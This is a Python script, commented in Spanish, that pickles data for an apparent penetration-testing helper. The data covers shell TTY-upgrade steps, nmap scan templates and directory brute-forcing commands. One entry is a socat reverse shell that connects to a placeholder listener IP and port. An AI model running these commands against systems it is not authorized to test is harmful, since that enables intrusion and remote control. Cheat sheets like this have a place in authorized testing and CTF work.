import pickle
import os

# --- CAMBIO IMPORTANTE: Ruta en la raíz ---
output_dir = 'data' 

if not os.path.exists(output_dir):
    os.makedirs(output_dir)
    print(f"[+] Creado directorio: {output_dir}")

# --- 1. DATOS DE TTY ---
tty_procedures = {
    "python": {
        "name": "Python TTY upgrade",
        "description": "La mejor opcion si python se encuentra instalado",
        "commands": [
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "export TERM=xterm-256color",
            "stty raw -echo",
            "fg"
        ],
        "notes": "Presiona ENTER despues de fg si la terminal perece congelada"
    },
    "script": {
        "name": "script command",
        "description": "Use script para spwanear una bash",
        "commands": [
            "script /dev/null -c bash",
            "export TERM=xterm-256color",
            "stty raw -echo",
            "fg"
        ],
        "notes": "Funciona bien cuando Python no esta instalado"
    },
    "sh_only": {
        "name": "Minimal /bin/sh upgrade",
        "description": "Cuando nada mas existe",
        "commands": [
            "stty raw -echo",
            "fg",
            "export TERM=xterm"
        ],
        "notes": "Limitado, pero permite Ctrl+C"
    },
    "socat": {
        "name": "Socat full TTY",
        "description": "PTY completa si Socat esta instalado",
        "commands": [
            "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>"
        ],
        "notes": "Requiere de listener en tu maquina"
    }
}

# --- 2. DATOS PARA NMAP ---
nmap_scans = {
    "fast": "nmap -F {ip} -oN scan_fast.txt",
    "full": "nmap -p- -sV -sC {ip} -oN scan_full.txt",
    "udp":  "nmap -sU --top-ports 100 {ip}",
    "vuln": "nmap --script vuln {ip}"
}

# --- 3. DATOS PARA DISCOVERY ---
discovery_tools = {
    "gobuster": "gobuster dir -u {url} -w {wordlist} {extensions}",
    "ffuf": "ffuf -u {url} -w {wordlist} {extensions}",
    "dirsearch": "dirsearch -u {url} -w {wordlist} {extensions}"
}


# --- GUARDADO EN BINARIO ---

# Guardar TTY
with open(os.path.join(output_dir, 'tty_procedures.bin'), 'wb') as f:
    pickle.dump(tty_procedures, f)
    print(f"[OK] Generado {output_dir}/tty_procedures.bin")

# Guardar Nmap
with open(os.path.join(output_dir, 'nmap_scans.bin'), 'wb') as f:
    pickle.dump(nmap_scans, f)
    print(f"[OK] Generado {output_dir}/nmap_scans.bin")

# Guardar Discovery
with open(os.path.join(output_dir, 'discovery_tools.bin'), 'wb') as f:
    pickle.dump(discovery_tools, f)
    print(f"[OK] Generado {output_dir}/discovery_tools.bin")

print("\n[OK] Todos los binarios han sido generados correctamente en la raíz 'data/'.")